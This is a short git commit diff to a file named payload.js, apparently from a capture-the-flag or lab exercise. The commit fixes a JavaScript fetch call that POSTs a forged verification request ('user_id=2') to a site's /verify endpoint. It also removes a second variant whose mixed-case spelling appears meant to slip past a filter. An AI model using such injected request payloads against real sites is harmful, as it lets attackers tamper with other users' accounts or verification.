f182b41fc2544a059142c9db4e7fdd711df73ee9
Noob Sek <noob@localhost.localdomain>
2024-12-20 01:54:32 +0530

    changed the request again

--- payload.js
+++ payload.js
@@ -1,12 +1,7 @@
 fetch("/verify",{
     method: "POST",
-    headers:"{Content-Type: application/x-www-form-urlencoded}",
+    headers:{"Content-Type": "application/x-www-form-urlencoded"},
     body: "user_id=2&verification_id:1"
 });
 
 
-fetch("/verIfy",{
-    method: "POST",
-    headers:{"Content-Type": "application/x-www-fOrm-urlencoded"},
-    body: "user_id=2&verIfication_id:1"
-});
